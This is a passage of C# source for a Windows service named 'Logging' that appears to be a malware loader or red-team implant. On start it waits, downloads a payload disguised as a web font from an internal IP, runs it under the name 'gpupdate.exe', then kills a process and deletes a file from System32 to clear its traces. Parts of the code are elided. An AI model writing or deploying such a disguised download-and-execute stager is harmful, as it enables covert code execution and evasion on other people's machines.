...
namespace Logging
{
    public partial class Service1 : ServiceBase
    {
        ...
        {
            /// Vars ///
            string url = "http://10.181.96.103/css/fonts/fontawesome.woff";
            string TargetBinary = "gpupdate.exe";
            string CompressionAlgorithm = "none";
            Thread.Sleep(5000);
            DownloadAndExecute(url, TargetBinary, CompressionAlgorithm);
            Clearup();
        }

        public void WriteToFile(string Message)
        {
            string path = "c:\\User\\Public\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = "c:\\Users\\Public\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
        ...
        public void DownloadAndExecute(string url, string TargetBinary, string CompressionAlgorithm)
        {
        ...
        {
            Thread.Sleep(10000);
            // Find and close a process by its name
            string processName = "logging"; // Replace with the name of the process you want to close
            try
            {
            ...
            // Delete the file after waiting for the process to die
            Thread.Sleep(3000);
            string filePath = "C:\\Windows\\System32\\logging"; // Replace with the actual path to your file
            try
            {
                if (File.Exists(filePath))
                {
